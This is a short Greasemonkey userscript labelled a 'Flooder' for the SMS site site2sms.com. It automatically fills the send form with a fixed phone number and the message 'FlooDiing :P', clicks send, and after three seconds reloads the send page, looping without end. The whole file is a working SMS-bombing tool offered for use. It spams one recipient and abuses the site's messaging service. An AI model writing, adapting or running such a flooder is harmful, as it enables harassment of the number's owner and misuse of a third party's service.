// ==UserScript==
// @name          site2sms.com Flooder By ramanxXx
// @namespace     http://Paplu.net
// @description   basic Greasemonkey script
// @include        http://*site2sms.com/user/send_sms.asp
// @include        http://*site2sms.com/user/send_sms_next.asp
// @include        http://*site2sms.com/*
// ==/UserScript==


var code;
if(document.location=="http://www.site2sms.com/user/send_sms.asp"||document.location=="http://www.site2sms.com/user/send_sms.asp")
{

document.getElementById('txtMobileNo').value=9999999999;

code='FlooDiing :P ';


document.getElementById('txtMessage').value=code;
void(0);
document.getElementById('send_sms').click();
}

if(document.location=="http://www.site2sms.com/user/send_sms_next.asp")
{
setTimeout('document.location="http://www.site2sms.com/user/send_sms.asp"',3000);
}